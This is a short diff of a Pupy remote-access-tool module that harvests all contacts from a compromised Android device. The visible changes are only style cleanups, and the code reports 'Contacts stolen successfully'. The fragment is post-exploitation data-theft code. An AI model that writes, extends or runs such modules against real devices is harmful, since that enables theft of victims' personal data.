@@ -6,7 +6,8 @@ __class_name__="contacts"
 
 from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
 from pupylib.utils.common import getLocalAndroidPath
-import os, copy
+import os
+import copy
 
 @config(cat="gather", compat=["android"])
 class contacts(PupyModule):
@@ -22,7 +23,7 @@ class contacts(PupyModule):
         self.client.load_package("pupydroid.contacts")
         self.client.load_package("pupydroid.utils")
         path = getLocalAndroidPath(localFolder=args.localOutputFolder, androidID=self.client.conn.modules['pupydroid.utils'].getAndroidID(), userName=self.client.desc['user'])
-        if args.get_all==True:
+        if args.get_all:
             self.success("Getting contacts...")
             contacts = self.client.conn.modules['pupydroid.contacts'].getAllContacts()
             self.success("Contacts stolen successfully")
